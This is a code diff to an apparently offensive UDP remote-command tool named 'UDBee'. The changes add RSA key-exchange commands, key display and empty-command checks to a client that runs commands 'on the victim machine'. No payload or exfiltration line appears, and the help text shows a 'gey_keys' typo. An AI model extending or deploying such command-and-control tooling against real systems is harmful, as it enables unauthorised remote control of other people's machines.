@@ -60,7 +60,10 @@ def exchange_keys():
             break
         except:
             continue
-    log_error("<ansimagenta>Encryption keys was not exchanged, started exchanging now.</ansimagenta>")
+    if my_pub_key is None or target_pub_key is None:
+        log_error("<ansimagenta>Encryption keys was not exchanged, started exchanging now.</ansimagenta>")
+    else:
+        log_info("<ansimagenta>Generating a new RSA keys, exchanging keys now.</ansimagenta>")
     exchange_sock.sendto("gen_key".encode('utf8'), (target_ip, target_port))
     exchange_sock.close()
     get_response(listening_port)
@@ -189,6 +192,7 @@ def send_command(message, listening_port):
 
 def main():
     with patch_stdout():
+        global my_pub_key, my_priv_key, target_pub_key
         # Print logo and intro
         logo = f"""
 <ansiyellow>
@@ -214,13 +218,32 @@ def main():
                 sys.exit(1)
 
             elif command.lower() == "help":
-                print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflicts with one of UDBee special commands, just put exec: before the command (e.g. exec:help)</ansiblue>"))
+                print_formatted_text(HTML("<ansiyellow>Available commands:</ansiyellow>\n<ansigreen>help</ansigreen> : <ansiblue>shows this list</ansiblue>\n<ansigreen>my_keys</ansigreen> : <ansiblue>show my public and private keys</ansiblue>\n<ansigreen>target_key</ansigreen> : <ansiblue>show target public key</ansiblue>\n<ansigreen>gey_keys</ansigreen> : <ansiblue>generate a new RSA keys on attacker and client side</ansiblue>\n<ansigreen>exit - quit</ansigreen> : <ansiblue>exit the tool</ansiblue>\n<ansigreen>exec:</ansigreen> <ansiblue>if the command you wish to run on the victim machine conflicts with one of UDBee special commands, just put exec: before the command (e.g. exec:help)</ansiblue>"))
+                continue
 
+            elif command.startswith("gen_keys"):
+                exchange_keys()
+                continue
+            elif command.startswith("my_keys"):
+                if my_pub_key is None or my_priv_key is None:
+                    log_error("<ansired>Encryption keys was not exchanged, please exchange keys first.</ansired>")
+                    continue
+                log_info(f"<ansiblue>My public key:</ansiblue> <ansigreen>{my_pub_key})</ansigreen>")
+                log_info(f"<ansiblue>My private key:</ansiblue> <ansigreen>{my_priv_key}</ansigreen>")
+                continue
+            elif command.startswith("target_key"):
+                if target_pub_key is None:
+                    log_error("<ansired>Target public key was not exchanged, please exchange keys first.</ansired>")
+                    continue
+                log_info(f"<ansiblue>Target public key:</ansiblue> <ansigreen>{target_pub_key}</ansigreen>")
+                continue
             else:
                 # Allow user to force command execution if it conflicts with a special command
                 if command.startswith("exec:"):
                     command = command.replace("exec:","")
-
+                if command == "":
+                    log_error("<ansired>Command cannot be empty, please provide a valid command.</ansired>")
+                    continue
                 port = get_available_port()
 
                 # Use threads to send command and listen for response simultaneously
